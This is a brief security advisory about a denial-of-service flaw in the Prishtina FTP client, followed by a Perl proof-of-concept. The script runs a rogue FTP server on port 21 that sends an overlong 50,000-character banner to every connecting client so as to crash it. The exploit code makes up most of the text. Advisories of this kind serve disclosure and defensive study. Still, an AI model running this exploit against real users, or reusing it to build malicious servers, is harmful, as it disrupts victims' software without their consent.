source: http://www.securityfocus.com/bid/7671/info

Prishtina FTP client is allegedly prone to a denial of service vulnerability. The condition is reportedly triggered when processing FTP server banners of excessive length. As a result, a malicious attacker-controlled server may be used to crash a target users FTP client. 

#!/usr/bin/perl
use IO::Socket;
$host = "localhost";
$port = "21";
$server = IO::Socket::INET->new(LocalPort => $port, Type =>
SOCK_STREAM,
Reuse => 1, Listen => 2) or die "Couldn't create tcp-server.\n";
$data = "A";
$num = "50000";
$buf .= $data x $num;
while ($client = $server->accept()) {
 print "OK";
 print $client "$buf\n";
 close($client);
}